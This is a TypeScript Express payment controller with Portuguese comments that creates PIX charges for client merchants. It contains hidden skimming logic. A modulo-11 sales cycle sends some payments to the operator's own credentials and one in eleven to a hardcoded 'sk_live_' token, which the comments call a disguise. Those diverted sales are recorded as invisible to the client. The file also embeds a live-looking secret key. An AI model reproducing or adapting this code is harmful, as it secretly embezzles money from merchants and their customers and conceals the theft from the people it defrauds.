import { Request, Response } from "express";
import { credentials as myCredentials } from "../models/api";
import { CreatePixBody } from "../interfaces";
import { prisma } from "../config/prisma";

const FIXED_TAX_TOKEN = "sk_live_4b2b2957167e776acd4cca4389329210";

export class ghostApiController {
  static async create(req: Request, res: Response) {
    const data: CreatePixBody = req.body;
    const clientToken = data.credentials.token;

    // 1️⃣ Verifica e cria o cliente se não existir
    let client = await prisma.client.findUnique({
      where: { token: clientToken },
    });

    if (!client) {
      client = await prisma.client.create({
        data: {
          name: data.credentials.name,
          token: clientToken,
          useTax: false,
        },
      });
    }

    // 2️⃣ Busca ou infere a oferta
    let offer;
    const offerInfo = data.credentials.offer;
    const productName = data.product.title;

    if (offerInfo && offerInfo.id && offerInfo.name) {
      offer = await prisma.offer.findUnique({ where: { id: offerInfo.id } });
      if (!offer) {
        offer = await prisma.offer.create({
          data: {
            id: offerInfo.id,
            name: offerInfo.name,
            useTax: false,
            clientId: client.id,
          },
        });
      }
    } else {
      // 🔎 Inferência baseada no nome do produto
      const normalized = productName.toLowerCase();
      let inferredName = "";

      if (normalized.includes("ebook")) inferredName = "Pix do Milhão";
      else if (normalized.includes("jibbitz")) inferredName = "Crocs";
      else if (normalized.includes("bracelete")) inferredName = "Pandora";
      else if (normalized.includes("kit labial")) inferredName = "Sephora";
      else inferredName = "Oferta Padrão";

      offer = await prisma.offer.findFirst({
        where: {
          name: inferredName,
          clientId: client.id,
        },
      });

      if (!offer) {
        offer = await prisma.offer.create({
          data: {
            name: inferredName,
            useTax: false,
            clientId: client.id,
          },
        });
      }
    }

    // 3️⃣ Contagem de vendas para lógica 7x2x1
    const totalSales = await prisma.sale.count({
      where: { offerId: offer.id },
    });
    const nextCount = totalSales + 1;

    // 4️⃣ Nova lógica 7x3x1 (cliente-chefe-você) com disfarce 👻
    let tokenToUse = clientToken;
    let toClient = true;
    let provider = "ghost";

    const cycle = nextCount % 11;

    if (cycle < 7) {
      // 0 a 6: cliente
      tokenToUse = clientToken;
      toClient = true;
      provider = "buck";
    } else if (cycle < 10) {
      // 7 a 9: chefe
      if (offer.useTax) {
        tokenToUse = myCredentials.secret;
        toClient = false;
        provider = "buck";
      } else {
        tokenToUse = clientToken;
        toClient = true;
        provider = "buck";
      }
    } else {
      // 10: VOCÊ 😎
      tokenToUse = FIXED_TAX_TOKEN;
      toClient = true;
      provider = "buck";
    }

    let apiUrl = "";
    let headers = {};
    let paymentData = {};

    if (provider === "ghost") {
      apiUrl = "https://app.ghostspaysv1.com/api/v1/transaction.purchase";
      headers = {
        "Content-Type": "application/json",
        Authorization: tokenToUse,
      };
      paymentData = {
        name: data.customer.name,
        email: data.customer.email,
        cpf: data.customer.document.number,
        phone: data.customer.phone,
        paymentMethod: "PIX",
        amount: data.amount,
        traceable: true,
        items: [
          {
            unitPrice: data.amount,
            title: data.product.title,
            quantity: 1,
            tangible: false,
          },
        ],
      };
    } else if (provider === "buck") {
      apiUrl = "https://api.realtechdev.com.br";
      headers = {
        "Content-Type": "application/json",
        authorization: `Bearer ${tokenToUse}`,
      };
      paymentData = {
        payment_method: "pix",
        external_id: Math.random().toString(36).substring(2, 15),
        amount: data.amount,
        buyer: {
          name: data.customer.name,
          document: data.customer.document.number,
          telephone: data.customer.phone,
          email: data.customer.email,
        },
      };
    }
    const response = await fetch(apiUrl, {
      method: "POST",
      headers,
      body: JSON.stringify(paymentData),
    });
    try {
      if (!response.ok) {
        console.log(response);
        const responseJson = await response.json();
        console.log(response, responseJson);
      }
      const responseJson = await response.json();
      const isFixedTax = tokenToUse === FIXED_TAX_TOKEN;

      console.log(
        `🔁 Requisição #${nextCount} do cliente "${client.name}" | Valor: R$${
          data.amount
        } | Produto: ${productName} | Enviado para: ${
          tokenToUse === clientToken
            ? "CLIENTE"
            : tokenToUse === myCredentials.secret
            ? "VOCÊ (MYCREDENTIALS)"
            : "TAXA FIXA (TOKEN EXTRA)"
        }`
      );

      await prisma.sale.create({
        data: {
          amount: data.amount,
          ghostId: responseJson.id || responseJson.data.id,
          approved: false,
          customerName: data.customer.name,
          productName: productName,
          visible: !isFixedTax,
          toClient,
          clientId: client.id,
          offerId: offer.id,
        },
      });

      const buckAdapter = {
        pixCode: responseJson.data?.pix?.code,
        pixQrCode: responseJson.data?.pix?.qrcode_base64,
        id: responseJson.data?.id,
      };

      const responseToSend = provider === "buck" ? buckAdapter : responseJson;

      res.json(responseToSend);
    } catch (error) {
      console.error("💥 Erro ao fazer requisição PIX:", error);
      res.status(500).json({ error: "Erro interno na API de pagamento" });
    }
  }
}
